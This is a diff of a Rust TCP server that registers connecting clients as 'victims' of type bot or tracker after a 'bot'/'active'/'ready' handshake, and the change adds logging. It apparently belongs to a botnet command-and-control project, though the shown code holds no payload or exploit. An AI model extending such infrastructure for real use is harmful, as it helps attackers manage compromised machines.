@@ -1,6 +1,9 @@
 mod tracker;
 
-use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::{mpsc, Mutex, Arc}};
+#[macro_use]
+extern crate log;
+
+use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::{Mutex, Arc}, env};
 
 use crate::tracker::is_victim_listening;
 
@@ -17,13 +20,18 @@ pub struct Victim {
 }
 
 fn main() {
+    if env::var("RUST_LOG").is_err() {
+        env::set_var("RUST_LOG", "debug")
+    }
+    env_logger::init();
     let listener = TcpListener::bind("192.168.0.12:9570").unwrap();
     let victims: Arc<Mutex<Vec<Victim>>> = Arc::new(Mutex::new(Vec::new()));
 
+    info!("Server started");
     for stream in listener.incoming() {
         let stream = stream.unwrap();
 
-        println!("Connection established");
+        info!("Connection established");
         thread::spawn({
             let victims = Arc::clone(&victims);
             move || {
@@ -31,7 +39,7 @@ fn main() {
                 if let Some(victim) = victim {
                     let mut victims = victims.lock().unwrap();
                     victims.push(victim);
-                    println!("{:?}", victims);
+                    debug!("victims: {:?}", victims);
                 }
             }
         });
@@ -44,26 +52,32 @@ fn handle_connection(mut stream: TcpStream) -> Option<Victim> {
     buf_reader
         .read_until(0, &mut http_request).unwrap();
 
-    let http_request = std::str::from_utf8(&http_request).unwrap().replace('\0', "");
-    println!("Request: {:?} {:?}", http_request.as_bytes(), "bot".as_bytes());
-    let response = match http_request.as_str() {
-        "bot" => "active".to_string(),
-        _ => {
-            println!("oui");
-            return None;
-        }
+    let http_request = std::str::from_utf8(&http_request).unwrap();
+    debug!("Request: {:?} {:?}", http_request.as_bytes(), "bot".as_bytes());
+    if http_request != "bot\0" {
+        println!("oui");
+        return None;
     };
+    if let Err(_) = stream.write_all("active\0".as_bytes()) {
+        return None;
+    }
     let current_ip = stream.peer_addr().unwrap();
-    println!("ip: {}", current_ip);
+    debug!("ip: {}", current_ip);
     let mut victim = Victim { ip: current_ip, victim_type: VictimType::Bot };
 
-    if is_victim_listening(&stream, &victim) {
-        println!("listen!!");
+    let mut buf_reader = BufReader::new(stream);
+
+    let mut buffer = Vec::new();
+    buf_reader.read_until(0, &mut buffer).unwrap();
+    let buffer = std::str::from_utf8(&buffer).unwrap();
+    if buffer != "ready\0" {
+        error!("The client's server responded '{}' instead of 'ready'", buffer);
+        return None;
+    }
+    if is_victim_listening(&victim) {
+        info!("The victim: {} is listening and will become a tracker", victim.ip);
         victim.victim_type = VictimType::Tracker;
     }
 
-    if let Err(_) = stream.write_all(response.as_bytes()) {
-        return None;
-    }
     return Some(victim);
 }
